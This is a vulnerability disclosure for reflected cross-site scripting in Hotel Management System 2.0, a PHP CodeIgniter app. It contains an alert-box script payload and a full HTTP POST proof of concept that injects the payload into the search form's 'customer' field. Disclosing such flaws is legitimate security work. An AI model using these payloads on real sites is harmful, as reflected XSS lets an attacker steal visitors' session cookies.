#### Title: Hotel Management System 2.0 Reflected Cross-Site Scripting
#### Author: Ashish Kumar (https://www.linkedin.com/in/ashish-kumar-0b65a3184)
#### Date: 03.07.2022
#### Vendor: https://www.sourcecodester.com/users/tips23
#### Software: https://www.sourcecodester.com/php-codeigniter-hotel-management-system-source-code
#### Version: 2.0
#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Refelected)/POC.md

#### Description：
#### Hotel Management System is vulnerable to Reflected cross-site scripting on the search parameter.

#### Impact:
 An attacker could steal cookies with a crafted URL sent to the victims.

#### Payload used:
`"><script>alert("XSS")</script>`

### POC

```
POST /ci_hms/search HTTP/1.1
Host: localhost
Content-Length: 11
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/ci_hms/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ci_session=9kn2p06ccqlaaf2fft0qpgso3qdgj7j1
Connection: close

customer="><script>alert("XSS")</script>
```

![image](https://github.com/CyberThoth/CVE/blob/19d02bfc410f0a57bf3dabb23bc7f31a18e0e07f/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Refelected)/1.png)

![image](https://github.com/CyberThoth/CVE/blob/19d02bfc410f0a57bf3dabb23bc7f31a18e0e07f/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Refelected)/2.png)
